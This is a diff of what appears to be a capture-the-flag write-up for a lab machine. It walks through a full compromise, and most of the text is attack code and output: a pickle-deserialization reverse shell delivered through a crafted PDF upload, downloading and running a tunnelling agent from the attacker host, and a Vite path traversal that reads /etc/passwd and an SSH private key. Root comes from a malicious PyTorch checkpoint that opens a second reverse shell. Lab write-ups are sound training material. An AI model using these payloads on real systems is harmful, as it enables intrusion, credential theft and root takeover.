@@ -7,7 +7,7 @@
 **Let's start off with a quick nmap scan.**
 
 ```bash
-ip=10.129.50.75
+ip=10.129.51.43
 
 ## TCP Scan
 nmap -p- --min-rate 10000 -n -Pn -oA nmap/bedside_tcp.htb $ip
@@ -89,25 +89,17 @@ import pickle
 import gzip
 import requests
 
-# 1. Create the malicious pickle payload for DIRECT reverse shell
+
 class RCE:
     def __reduce__(self):
-        # REPLACE 'YOUR_IP' WITH YOUR ACTUAL TUN0 IP ADDRESS
+
         cmd = """__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"')"""
         return (eval, (cmd,))
 
 with gzip.open('shell.pickle.gz', 'wb') as f:
     pickle.dump(RCE(), f)
 print("[+] Created shell.pickle.gz")
-
-# 2. Create the malicious PDF trigger
-# We point it to /tmp/shell so it looks for /tmp/shell.pickle.gz (a writable directory)
-# But we will upload our shell.pickle.gz to the web root, and we'll also upload it to /tmp via a second payload if needed.
-# Actually, let's just use the absolute path to the uploads dir, but name it something Apache won't block if we fall back.
-# Better yet: we will upload shell.pickle.gz, and the PDF will trigger it.
-
-# Hex encoded path: /var/www/research.bedside.htb/uploads/shell
-path = "/var/www/research.bedside.htb/uploads/s"
+path = "/var/www/research.bedside.htb/uploads/shell"
 hex_path = "".join(f"#{ord(c):02x}" for c in path)
 
 pdf_content = f"""%PDF-1.4
@@ -166,7 +158,7 @@ with open('exploit.pdf', 'wb') as f:
     f.write(pdf_content.encode())
 print("[+] Created exploit.pdf")
 
-# 3. Upload both files
+
 url = "http://research.bedside.htb/"
 
 print("[*] Uploading shell.pickle.gz...")
@@ -187,6 +179,14 @@ with open('exploit.pdf', 'rb') as f:
 
 {% code overflow="wrap" %}
 ```bash
+# [+] Created shell.pickle.gz
+# [+] Created exploit.pdf
+# [*] Uploading shell.pickle.gz...
+# [+] shell.pickle.gz uploaded!
+# [*] Uploading exploit.pdf to trigger RCE...
+# [!] CHECK YOUR NETCAT LISTENER NOW!
+# [+] exploit.pdf uploaded! Triggering deserialization...
+
 listener 9001
 datawrangler@data-wrangler:/app$
 ```
@@ -217,7 +217,178 @@ datawrangler@data-wrangler:/app$
 
 {% code overflow="wrap" %}
 ```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# then CTRL+Z
+stty raw -echo; fg
+# hit ENTER twice
+export TERM=xterm
+
 ls -la /
 # -rwxr-xr-x   1 root         root       0 Nov 11  2025 .dockerenv
+
+df -h
+# overlay         9.5G  3.4G  6.0G  37% /
+# /dev/sda4       9.5G  3.4G  6.0G  37% /datastore
 ```
 {% endcode %}
+
+**I think they're accidentaly exposed the /datastore i think it can be our entry point to escape docker**
+
+<mark style="color:blue;">**Step 7**</mark>&#x20;
+
+**i use a took to enumrate well the docker contaienr am into**
+
+{% code overflow="wrap" %}
+```bash
+./cdk_linux_amd64_thin evaluate
+./cdk_linux_amd64_thin run mount-disk
+
+# [  Information Gathering - Net Namespace  ]
+# host unix-socket found, seems container started with --net=host privilege.
+```
+{% endcode %}
+
+**This look good because the container is sharing the Host Machine's network and process list**
+
+**So i start by an internal scanning on open ports**
+
+{% code overflow="wrap" %}
+```bash
+for port in 80 443 3000 4000 5000 6000 7000 8000 8080 8443 9000 9090; do
+  (echo > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "Port $port is OPEN"
+done
+# Port 80 is OPEN
+# Port 3000 is OPEN
+```
+{% endcode %}
+
+**Lets forward it  using ligolo**
+
+{% code overflow="wrap" %}
+```bash
+# target
+curl http://10.10.14.6/agent -o agent
+chmod +x agent
+
+# on kali 
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# on target
+nohup ./agent -connect 10.10.14.6:11601 -ignore-cert > /dev/null 2>&1 &
+interface_create --name "ligolo"
+interface_add_route --name ligolo --route 240.0.0.1/32
+start --tun ligolo
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**This is a React‑based single‑page web application that acts as a medical image viewer**
+
+**In source page we found /@hmr**
+
+* **The `/@hmr` and HMR script suggest the server may be running Vite or a similar dev server that enables hot reloading.**
+
+**Visiting** [**http://240.0.0.1:3000/@hmr**](http://240.0.0.1:3000/@hmr)
+
+**we confirm that it's a Vite’s Hot Module Replacement client**
+
+**After searching i found that it can be vulnerable to path traversal so i try testing multipe payload until i found it**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+curl --path-as-is http://240.0.0.1:3000/../../../../etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# bin:x:2:2:bin:/bin:/usr/sbin/nologin
+.....
+# developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
+```
+{% endcode %}
+
+**So i will target the developper user and try to leak his SSH key**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+curl --path-as-is http://240.0.0.1:3000/../../../..//home/developer/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+-----END OPENSSH PRIVATE KEY-----
+
+chmod 600 id_rsa
+ssh -i id_rsa  developer@$ip
+developer@bedside:~$ id
+# uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 8**</mark>
+
+**So now let's elevate our privs**
+
+{% code overflow="wrap" %}
+```bash
+ss -tulnp 
+# tcp      LISTEN    0         4096             127.0.0.1:33661             0.0.0.0:*
+
+nc -v 240.0.0.1 33661
+(UNKNOWN) [240.0.0.1] 33661 (?) open
+
+# HTTP/1.1 400 Bad Request
+# Content-Type: text/plain; charset=utf-8
+# Connection: close
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
+latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   # sorts by mtime, picks newest
+loader = CheckpointLoader(
+    load_path=str(latest_ckpt),
+    load_dict={"model": model, "optimizer": optimizer},
+    map_location=DEVICE
+)
+loader(engine)   # ← this invokes torch.load() → executes pickle payload
+```
+{% endcode %}
+
+* **The checkpoint directory is `/datastore/checkpoints/` (writeable by the `developer` user?).**
+* **The script picks the most recently modified `.pt` file.**
+*   **If we can write a malicious `.pt` there, and make it the newest, the next `sudo` run will trigger code execution as root.**
+
+
+
+{% code overflow="wrap" %}
+```bash
+# from the container shell
+echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > /datastore/processed/dummy.png 
+chmod 755 /datastore
+ls -ld /datastore
+# drwxr-xr-x 9 datawrangler dataops 4096 Jul 19 16:01 /datastore
+
+# from the developer ssh shell
+pip show torch
+# Version: 2.5.0+cpu
+python3 -c '
+import torch, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ("bash -c \"bash -i >& /dev/tcp/10.10.14.6/9999 0>&1\"",))
+torch.save({"model": RCE()}, "/datastore/checkpoints/pwn.pt")
+print("[+] Payload created!")
+'
+# [+] Payload created!
+sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+
+
+# kali
+listener 9999
+root@bedside:/home/developer# id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+{% endcode %}
+
+<br>
